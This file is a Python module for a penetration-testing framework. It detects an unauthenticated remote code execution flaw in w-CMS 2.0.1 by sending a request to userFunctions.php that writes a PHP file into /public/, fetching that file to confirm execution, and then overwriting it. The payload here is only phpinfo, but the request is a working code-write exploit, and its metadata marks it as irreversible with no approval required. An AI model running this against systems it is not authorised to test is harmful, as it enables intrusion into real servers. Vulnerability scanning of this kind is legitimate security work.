#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""w-CMS userFunctions.php arbitrary PHP write RCE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'w-CMS - userFunctions.php RCE Detection',
        'description': (
            'Detects w-CMS 2.0.1 RCE by writing phpinfo via userFunctions.php '
            'and fetching /public/<file>.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'w-cms', 'rce', 'upload', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/27523',
        ],
    }

    def run(self):
        fname = self.random_text(8) + '.php'
        for base in ('', '/w-cms', '/wcms'):
            probe = self.http_request(method='GET', path=f'{base}/index.php', allow_redirects=False)
            if not probe or 'w-CMS' not in (probe.text or ''):
                continue
            write = (
                f'{base}/userFunctions.php?udef=activity&type={fname}'
                '&content=%3C?php%20phpinfo();%20?%3E'
            )
            self.http_request(method='GET', path=write, allow_redirects=False)
            g = self.http_request(method='GET', path=f'{base}/public/{fname}', allow_redirects=False)
            if g and '<title>phpinfo()' in (g.text or ''):
                # cleanup
                self.http_request(
                    method='GET',
                    path=(
                        f'{base}/userFunctions.php?udef=activity&type={fname}'
                        '&content=%3C?php%20exit;%20?%3E'
                    ),
                    allow_redirects=False,
                )
                self.set_info(
                    severity='critical',
                    reason='w-CMS userFunctions.php RCE',
                    path=f'{base}/userFunctions.php',
                )
                return True
        return False
